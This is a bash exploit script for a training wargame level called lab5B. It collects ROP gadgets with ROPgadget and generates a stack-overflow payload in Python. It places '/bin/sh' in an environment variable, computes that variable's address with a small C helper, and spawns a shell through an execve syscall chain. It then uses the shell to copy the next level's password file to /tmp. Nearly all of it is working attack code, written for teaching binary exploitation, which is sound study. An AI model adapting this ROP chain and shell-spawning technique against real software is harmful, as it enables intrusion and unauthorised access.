#!/bin/bash

###############################
##  Exploit for level lab5B  ##
###############################

#   Exploitation: The goal of this level is to exploit the overflow bug to
# inject a ROP chain in the stack and do whatever we need to get the flag.

# This time we don't have system() linked so we have to figure something
# out. The functions open(), read() and write() are linked and therefore
# we can use them to read the flag; this would be pretty much like the
# previous level so I am going to build a ROP chain with gadgets.

# (I may write an exploit using ret2libc aswell)


# In order to get the addresses of the gadgets, we will use ROPgadget tool
echo "[+] Collecting gadgets with ROPgadget, this could take a while..."
ROPgadget --binary /levels/lab05/lab5B > /tmp/.gdgt5B.txt
echo "[+] Gadgets collected!"

# I've found theese gadgets that combined seem to give me a shell. Let's try
# them out:

# - The first gadget will zero out ecx and eax registers and move the "/bin/sh"
#   pointer to ebx. It will also move the stack pointer a bit so we must adjust
#   the stack accordingly:
#       xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret

# - This gadget will zero out the edx register:
#       mov edx, ecx ; pop esi ; pop edi ; pop ebp ; ret

# - The next one will set eax to 0xb (if we repeat it 0xb times)
#       nop ; inc eax ; ret

# - Finally, this one will make the syscall
#       int 0x80

g1=$(cat /tmp/.gdgt5B.txt | grep ": xor ecx, ecx" | cut -d" " -f1)
g2=$(cat /tmp/.gdgt5B.txt | grep ": mov edx, ecx" | cut -d" " -f1)
g3=$(cat /tmp/.gdgt5B.txt | grep ": nop ; inc eax" | cut -d" " -f1)
g4=$(cat /tmp/.gdgt5B.txt | grep ": int 0x80" | cut -d" " -f1)

# This python script will craft the string which will prepare the stack
cat > /tmp/.exploit.py <<EOF
import struct
import sys

g1 = struct.pack('<I', int(sys.argv[1], 16))
g2 = struct.pack('<I', int(sys.argv[2], 16))
g3 = struct.pack('<I', int(sys.argv[3], 16))
g4 = struct.pack('<I', int(sys.argv[4], 16))
shellp = struct.pack('<I', int(sys.argv[5], 16))
pad = 'A' * (0x98 - 0x10 + 4)  # Since the buffer is at [esp+0x10]

buf = pad + g1 + shellp  # When the program enters the first gadget, esp will point
                         # to shellp and will be loaded to ebx.
buf += 'AAAA' * 3        # Adjustment for the three pop instructions in gadget 1
buf += g2 + 'AAAA' * 3   # Gadget 2 and the adjustment for the pop instructions
buf += g3 * 0xb          # Finally, the last 2 gadgets to set eax and call the kernel
buf += g4
print buf
EOF

# We are almost ready to exploit the level, we just need a pointer to "/bin/sh"
# in order to gain a shell propertly.
# Since there isn't a desired pointer in the binary, we have to create it: an
# environment variable will fit our purposes.

export BINSHPOINTER="/bin/sh"

# Now we have to predict it's address (without ASLR will be easy enough)
cat > /tmp/.getenvaddr.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char *p = getenv(argv[1]);
    p += ((strlen(argv[2]) - strlen(argv[0]))*2) - 12;
    printf("%p\n", p);
    return 0;
}
EOF

gcc -o /tmp/.getenvaddr /tmp/.getenvaddr.c

shaddr=$(/tmp/.getenvaddr BINSHPOINTER /levels/lab05/lab5B)


# Now we are ready to exploit the level
# python /tmp/.exploit2.py $g1 $g2 $g3 $g4 $shaddr > /tmp/d
# /levels/lab05/lab5B < /tmp/d
passfile="/tmp/lab5A.pass"
(python /tmp/.exploit.py $g1 $g2 $g3 $g4 $shaddr; echo "cat /home/lab5A/.pass > $passfile") | /levels/lab05/lab5B 
echo "[+] Password saved in $passfile"
echo "[+] Cleaning-up..."
rm -f /tmp/.getenvaddr /tmp/.exploit.py
